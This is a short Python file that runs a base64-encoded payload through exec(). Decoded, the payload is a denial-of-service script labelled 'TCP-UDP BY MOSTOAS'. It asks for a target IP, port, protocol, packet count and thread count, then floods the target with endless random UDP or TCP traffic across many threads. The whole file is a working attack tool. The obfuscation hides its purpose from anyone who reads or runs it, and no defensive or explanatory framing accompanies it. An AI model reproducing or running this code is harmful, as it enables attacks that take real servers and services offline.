import base64
exec(base64.b64decode("IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgcmFuZG9tCmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwoKcHJpbnQoIlwwMzNbOTNtVENQLVVEUCBCWSBNT1NUT0FTIFwwMzNbOTNtIikKCmlwID0gc3RyKGlucHV0KCJcMDMzWzkzbSBJUCA6IFwwMzNbOTNtIikpCnBvcnQgPSBpbnQoaW5wdXQoIlwwMzNbOTNtIFBvcnQgOiBcMDMzWzkzbSIpKQpjaG9pY2UgPSBzdHIoaW5wdXQoIlwwMzNbOTNtIFVEUC9UQ1AgS0FMQVUgVURQIFkgVENQIE46IFwwMzNbOTNtIikpCnRpbWVzID0gaW50KGlucHV0KCJcMDMzWzkzbSBQYWtldCBOeWEgOiBcMDMzWzkzbSIpKQp0aHJlYWRzID0gaW50KGlucHV0KCJcMDMzWzkzbSBUaHJlYWRzOiBcMDMzWzkzbSIpKQpkZWYgcnVuKCk6CglkYXRhID0gcmFuZG9tLl91cmFuZG9tKDIwMTc5KQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCgkJCWFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCgkJCWZvciB4IGluIHJhbmdlKHRpbWVzKToKCQkJCXMuc2VuZHRvKGRhdGEsYWRkcikKCQkJcHJpbnQoaSArIiBNdCBBd29rYXdvayAiKQoJCWV4Y2VwdDoKCQkJcHJpbnQoIlshXSBNdCBZYWhhaGFoIE1hbXB1c3MiKQoKZGVmIHJ1bjIoKToKCWRhdGEgPSByYW5kb20uX3VyYW5kb20oODAwKQoJaSA9IHJhbmRvbS5jaG9pY2UoKCJbKl0iLCJbIV0iLCJbI10iKSkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJCQlzLmNvbm5lY3QoKGlwLHBvcnQpKQoJCQlzLnNlbmQoZGF0YSkKCQkJZm9yIHggaW4gcmFuZ2UodGltZXMpOgoJCQkJcy5zZW5kKGRhdGEpCgkJCXByaW50KGkgKyIgTUFNUFVTIE1UISEiKQoJCWV4Y2VwdDoKCQkJcy5jbG9zZSgpCgkJCXByaW50KCJbKl0gTXQgWWFhIGJhbmc/IikKCmZvciB5IGluIHJhbmdlKHRocmVhZHMpOgoJaWYgY2hvaWNlID09ICd5JzoKCQl0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuKQoJCXRoLnN0YXJ0KCkKCWVsc2U6CgkJdGggPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IHJ1bjIpCgkJdGguc3RhcnQoKQ=="))